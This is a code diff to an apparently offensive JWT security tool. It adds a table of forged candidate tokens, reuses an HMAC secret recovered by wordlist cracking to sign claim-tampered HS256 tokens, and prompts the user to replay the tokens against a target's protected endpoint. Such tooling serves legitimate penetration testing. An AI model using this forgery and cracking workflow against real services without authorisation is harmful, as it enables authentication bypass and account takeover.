@@ -109,6 +109,12 @@ class _AnsiFallback:
         for sev, msg in findings:
             print(f"  {colors.get(sev,'')}{sev:<4}{self._C.E}  {msg}")
 
+    def results_table(self, results):
+        for i, (label, tok) in enumerate(results, 1):
+            preview = tok if len(tok) <= 64 else tok[:64] + "..."
+            print(f"  {self._C.BOLD}{i:>2}{self._C.E}. {label}")
+            print(f"      {self._C.G}{preview}{self._C.E}")
+
     def menu(self, title, groups, footer=""):
         self.rule(title)
         for gname, items in groups:
@@ -198,6 +204,17 @@ class _RichUI:
                      "OK": "green"}
         for sev, msg in findings:
             t.add_row(f"[{sev_style.get(sev,'')}]{sev}[/]", msg)
+        self.c.print(t)
+
+    def results_table(self, results):
+        t = Table(box=box.SIMPLE, show_header=True, header_style="bold",
+                  expand=False)
+        t.add_column("#", justify="right", style="dim", no_wrap=True)
+        t.add_column("Attack", no_wrap=True)
+        t.add_column("Token (preview)", style="green")
+        for i, (label, tok) in enumerate(results, 1):
+            preview = tok if len(tok) <= 46 else tok[:46] + "…"
+            t.add_row(str(i), label, preview)
         self.c.print(t)
 
     def menu(self, title, groups, footer=""):
@@ -597,6 +614,7 @@ class App:
         self.payload = None
         self.signature = ""
         self._servers = []
+        self._cracked = None   # last HMAC secret recovered via option b
 
     # ---- token intake / analysis ---------------------------------------- #
     def load_token(self, initial=None):
@@ -790,7 +808,7 @@ class App:
                           "[h] HS256+secret   [k] keep header, unsigned   "
                           "[skip]", default="n")
         if how == "h":
-            secret = self.ui.ask("HMAC secret", default="secret")
+            secret = self.ui.ask("HMAC secret", default=self._cracked or "secret")
             h = dict(self.header); h["alg"] = "HS256"
             self._emit([("claim-tampered, HS256", hmac_sign(h, p, secret))])
         elif how == "k":
@@ -815,8 +833,8 @@ class App:
         secret, tried = self.ui.crack_run(
             wl, total, lambda s: verify_hmac(self.token, alg, s))
         if secret is not None:
-            self.ui.success(f"SECRET FOUND after {tried}: "
-                            f"{secret.decode(errors='replace')}")
+            self._cracked = secret.decode(errors="replace")
+            self.ui.success(f"SECRET FOUND after {tried}: {self._cracked}")
             if self.ui.confirm("Forge a token with this secret now?", default=True):
                 self.flow_tamper()
         else:
@@ -842,11 +860,16 @@ class App:
                                  "http://127.0.0.1:8000/cert.pem")[0]
             for a in ("ES256", "EdDSA"):
                 results += attack_resign(self.header, self.payload, a)[0]
+        self.ui.rule(f"{len(results)} candidate tokens generated")
+        self.ui.results_table(results)
         path = self.ui.ask("Write all tokens to", default="jwtweak_tokens.txt")
         with open(path, "w") as fh:
             for label, tok in results:
                 fh.write(f"# {label}\n{tok}\n\n")
-        self.ui.success(f"Wrote {len(results)} candidate tokens to {path}")
+        self.ui.success(f"Saved {len(results)} tokens to {path}")
+        self.ui.info("Next: replay each token against the target's protected "
+                     "endpoint (e.g. with curl or Burp Repeater). Any token the "
+                     "server accepts points to a validation flaw.")
 
     # ---- menu loop ------------------------------------------------------- #
     def menu_groups(self, rec):
